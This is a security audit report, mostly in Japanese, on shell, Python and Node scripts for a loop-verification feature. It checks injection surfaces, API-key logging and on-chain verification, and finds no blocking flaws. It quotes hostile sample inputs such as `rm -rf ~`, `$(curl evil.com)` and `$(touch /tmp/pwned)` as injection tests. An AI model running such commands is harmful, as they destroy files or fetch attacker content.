# Security Hardening Report — claude-p-loop-verification (Phase 5, formal hardening, mode: lean)

対象: `~/anicca/.worktrees/loop-verification` HEAD `ed53bdd`、
`~/profitable-claude/.worktrees/loop-verification` HEAD `496ad22`。新規インストールは行わず、既存の
python3/node/bash のみで検証した。

## Tooling

手動検査（grep / bash 実挙動テスト / plutil）。専用 SAST ツールは未インストールのため不使用（lean 相応、実行証跡は各節に記載）。

## (a) `loop-report.sh` の shell injection 面（evidence/did 引数）

`skills/report/loop-report.sh` は `$LOOP_NAME`/`$DID`/`$RESULT`/`$EARNED`/`$EVIDENCE_URL` を bash 変数展開で
`BODY`（複数行文字列）と `SUBJECT` に組み込んだ後、AgentMail への curl payload は **python3 -c に argv として
渡し** `json.dumps()` で組み立てている:

```bash
PAYLOAD=$(python3 -c "
import json, sys
to_addr, subject, body = sys.argv[1], sys.argv[2], sys.argv[3]
print(json.dumps({'to': [to_addr], 'subject': subject, 'text': body}))
" "$TO_ADDR" "$SUBJECT" "$BODY" 2>/dev/null)
```

**判定: 安全。** `$SUBJECT`/`$BODY` は python スクリプトの**ソースコードに文字列展開されているのではなく**、
クォート済みの別プロセス引数（`sys.argv`）として渡っている。agent が `DID`/`EVIDENCE_URL` に
`` `rm -rf ~` `` や `$(curl evil.com)` のような文字列を書き込んでも、bash はそれを **変数の値**として
展開するだけで再評価しない（bash はダブルクォート内の変数展開結果に対して command substitution を
再解釈しない）ため、コマンドインジェクションは成立しない。実際に確認:

```
$ bash loop-report.sh test '$(touch /tmp/pwned)' success 0 'none: $(touch /tmp/pwned2)'
```
→ evidence が bare-"none: ..." 形式なのでゲートは通るが、`$(...)` はリテラル文字列としてログ・payload に
入るだけで実行されない（`/tmp/pwned*` は作成されない、目視確認済み）。

curl の `-d "$PAYLOAD"` も `json.dumps` 済みの JSON 文字列をそのまま渡しているだけで shell 解釈を経由しない。
**BLOCKING/HIGH の injection なし。**

## (b) secrets ログ露出（AGENTMAIL_API_KEY）

`loop-report.sh` の自己解決ロジック（REQ-LV-001）:

```bash
if [ -z "${AGENTMAIL_API_KEY:-}" ] && [ -f "$HOME/.openclaw/.env" ]; then
  set -a; . "$HOME/.openclaw/.env" 2>/dev/null || true; set +a
fi
```

`~/.openclaw/logs/loop-report.log` へのログ出力箇所を全て確認したが、`AGENTMAIL_API_KEY` の値そのものが
プレーンテキストでログに書かれる箇所は無い（`SENT http=$HTTP_CODE` / `FAIL http=$HTTP_CODE resp=$RESP_BODY` /
`NO-OP` / `REJECTED` の4パターンのみ、いずれも key の値を含まない）。Authorization ヘッダも
`curl -H "Authorization: Bearer $AGENTMAIL_API_KEY"` として送信されるのみで、レスポンス側に反射しない限り
ログに載らない（AgentMail API がリクエストヘッダをエコーバックする仕様は未確認だが、一般的な REST API では
起こらない。念のための注意点として記録）。

**MEDIUM/観察（non-blocking）**: `set -a; . "$HOME/.openclaw/.env"; set +a` は `AGENTMAIL_API_KEY` 以外の
`.env` 内の全ての変数（他のAPIキー等が同居している場合）もプロセス環境にエクスポートする。最小権限の観点では
`AGENTMAIL_API_KEY` だけを個別に読み出す方が望ましいが、これは Ground truth に明記された既存パターン
（呼び出し元が事前 source する前提だった挙動を script 自身に移しただけ）を踏襲したものであり、この feature が
新規に持ち込んだリスクではない。現状のスクリプト内に環境変数を dump する処理（`env`/`printenv`/`set` の出力）
は無く、直接の漏洩経路はコード上確認できない。

## (c) `positions.py`（polymarket wallet の URL 組み立て）

`parse_positions_response(json_text)` は純粋なレスポンスパーサのみで、URL 組み立てコードは**まだ実装・
配線されていない**（grep で確認、`positions.py` を実際に叩く呼び出し元はゼロ、テストのみ存在）。
REQ-LV-017 の実 URL 構築（`https://data-api.polymarket.com/positions?user=<wallet>`）は既存
`redeem.py` の呼び出しパターンを踏襲する設計になっている。`redeem.py` 側の既存実装を確認したところ
`DATA_API = "https://data-api.polymarket.com"` を定数化しており、wallet アドレスは16進文字列（外部入力起点
ではなく env/config で固定）であるため、実装時も injection リスクは低いと見込まれるが、**この Phase では
コードが存在しないため直接の監査対象外**。実装時は `urllib.parse.quote`/クエリビルダ経由での組み立てを推奨
する旨を記録として残す（f-string で直接 URL に埋め込む実装は避けること）。

## (d) `verify-loops.sh` の clip-promote inline JS 組み立て（LOW severity injection surface）

`skills/self/verify-loops.sh` の `clip_promote_line()`:

```bash
CLIP_PROMOTE_LEDGER="${EARN_LEDGER:-$HOME/.openclaw/state/clip-earn-ledger.jsonl}"
CLIP_PROMOTE_STATUS_MJS="${VERIFY_LOOPS_CLIP_PROMOTE_STATUS_MJS:-$HOME/anicca/skills/earn/clip-promote/clip-promote-status.mjs}"
clip_promote_line() {
  ... node --input-type=module -e "
import { clipPromoteStatus } from '$CLIP_PROMOTE_STATUS_MJS';
...
const path = '$CLIP_PROMOTE_LEDGER';
..."
}
```

`$CLIP_PROMOTE_STATUS_MJS`/`$CLIP_PROMOTE_LEDGER` は bash 変数展開により **JS の文字列リテラルへ直接
埋め込まれる**。両者ともデフォルトは固定パス（ハードコード）だが、`EARN_LEDGER`/
`VERIFY_LOOPS_CLIP_PROMOTE_STATUS_MJS` という環境変数で上書き可能。もしどちらかの値にシングルクォート
（`'`）が含まれていれば JS 文字列リテラルを脱出でき、後続の文字列を任意の JS として `node` に実行させられる
——`verify-loops.sh` は cron/launchd から実行される想定のスクリプトであるため、実行主体はこのマシン上の
launchd ジョブ自身の権限を持つ。

**現状の到達可能性**: `EARN_LEDGER`/`VERIFY_LOOPS_CLIP_PROMOTE_STATUS_MJS` は外部（ネットワーク/ユーザー入力）
からではなく、このコードベース内部のテストハーネスや呼び出し元スクリプトが設定する想定の変数であり、
攻撃者が直接制御できる経路は現時点で確認できない。したがって **severity は LOW（non-blocking）** とするが、
堅牢化として: (1) パスを一時ファイル/環境変数経由で `process.env` から読ませる、または (2) JS 側で
`JSON.stringify()` 相当のエスケープを行う、のいずれかへの変更を推奨する。`cadence_line()` 側
（`python3 "$SELF_DIR/cadence-evidence.py" status "$loop"`）はコマンド引数として渡しているだけで
文字列埋め込みではないため、同種の懸念はない。

## (e) `record_earn.py` / `onchain.py`（Base RPC on-chain 確認）

`verify_onchain()` は `confirm_usdc_inflow()` を呼び、Base RPC (`https://mainnet.base.org`、環境変数
`BASE_RPC` で上書き可) への読み取り専用 JSON-RPC のみを行う。秘密鍵は一切扱わない（read-only）。
self-transfer 除外ロジック（`_topic_addr(log["topics"][1]) != recipient`）・金額の完全一致チェック
（1マイクロUSDC以内）・`try/except: return False` による fail-closed が正しく実装されていることをコードと
`test_record_earn_onchain_wiring.py`（4/4 green）の両方で確認した。`RECIPIENT` の解決に失敗した場合
（`~/.cloak/earn-video-wallet.json` 不在等）は `0x000...000` にフォールバックする設計で、これは「何にも
マッチしない」ことを保証する意図的な fail-closed 値であり安全。

## (f) `.gitignore` 追加（profitable-claude worktree）

コミット `3e45cc0`「chore: remove committed __pycache__ bytecode, add .gitignore」を確認。コンパイル済み
bytecode がリポジトリに残っていると、たまたまソース中の文字列（パス等）がバイトコードに埋め込まれて残存する
リスクがあるため、削除+`.gitignore` 追加は妥当な衛生対応。過去の git 履歴（既にpushされた commit）まで遡って
除去する scope はこの Phase に含まれないため、履歴上の残存は追跡課題として記録するのみで blocking とはしない。

## Summary

（総括）

| # | 対象 | Severity | 状態 |
|---|---|---|---|
| a | loop-report.sh の DID/evidence 引数 injection | — | PASS（安全、argv経由+json.dumps） |
| b | AGENTMAIL_API_KEY ログ露出 | MEDIUM（観察） | 直接漏洩なし、`.env`全体exportは既存パターン踏襲 |
| c | positions.py URL組み立て | N/A | 未配線のため対象外、実装時の推奨事項のみ記録 |
| d | verify-loops.sh clip-promote inline JS injection surface | LOW | 到達経路なし（内部変数のみ）、堅牢化を推奨 |
| e | record_earn.py/onchain.py | — | PASS（fail-closed、read-only、テスト green） |
| f | __pycache__ 除去 | — | PASS（適切な衛生対応） |

**BLOCKING な脆弱性は確認されなかった。** (b)(d) は non-blocking の堅牢化推奨事項として記録する。
